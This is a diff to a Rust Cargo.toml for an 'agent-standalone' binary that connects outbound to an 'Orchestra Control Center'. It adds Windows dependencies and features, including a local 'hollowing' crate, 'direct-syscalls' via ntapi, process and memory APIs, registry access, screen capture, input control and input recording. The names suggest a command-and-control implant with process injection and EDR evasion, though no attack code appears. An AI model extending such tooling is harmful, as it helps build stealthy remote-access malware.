@@ -20,6 +20,7 @@ base64 = { workspace = true }
 serde_json = "1.0"
 serde = { workspace = true }
 module_loader = { path = "../module_loader" }
+optimizer = { path = "../optimizer" }
 toml = "1.1.2"
 directories = "6.0.0"
 rustls = { version = "0.23.38", default-features = false, features = ["ring", "std", "logging", "tls12"] }
@@ -29,14 +30,26 @@ rcgen = { version = "0.14.7", default-features = false, features = ["crypto", "r
 
 [target.'cfg(target_os = "linux")'.dependencies]
 x11cap = { version = "0.1", optional = true }
-enigo = { version = "0.2", optional = true }
+enigo = { version = "0.2", optional = true, default-features = false, features = ["x11rb"] }
 image = { version = "0.25", optional = true }
+
+[target.'cfg(windows)'.dependencies]
+enigo = { version = "0.2", optional = true }
+windows-capture = { version = "2", optional = true }
+winreg = "0.52"
+image = { version = "0.25", optional = true }
+ntapi = { version = "0.4", optional = true }
+windows = { version = "0.52", features = ["Win32_System_SystemServices", "Win32_Foundation"], optional = true }
+winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "winbase", "winnt", "libloaderapi", "wow64apiset"] }
+hollowing = { path = "../hollowing" }
 
 [features]
 persistence = []
 network-discovery = []
-remote-assist = ["dep:x11cap", "dep:enigo", "dep:image"]
-hci-research = []
+remote-assist = ["dep:enigo", "dep:image"]
+direct-syscalls = ["dep:ntapi", "dep:windows"]
+hci-research = ["dep:rdev", "dep:chrono", "dep:twox-hash"]
+forward-secrecy = ["common/forward-secrecy"]
 # Connect the agent outbound to an Orchestra Control Center instead of waiting
 # for an inbound connection from a console. The server address and PSK are
 # read from the ORCHESTRA_C / ORCHESTRA_SECRET runtime env vars, or baked in
@@ -47,6 +60,18 @@ outbound-c = []
 [[bin]]
 name = "agent-standalone"
 path = "src/main.rs"
+
+[dependencies.rdev]
+version = "0.5"
+optional = true
+
+[dependencies.chrono]
+version = "0.4"
+optional = true
+
+[dependencies.twox-hash]
+version = "1.6"
+optional = true
 
 [dev-dependencies]
 criterion = "0.8.2"
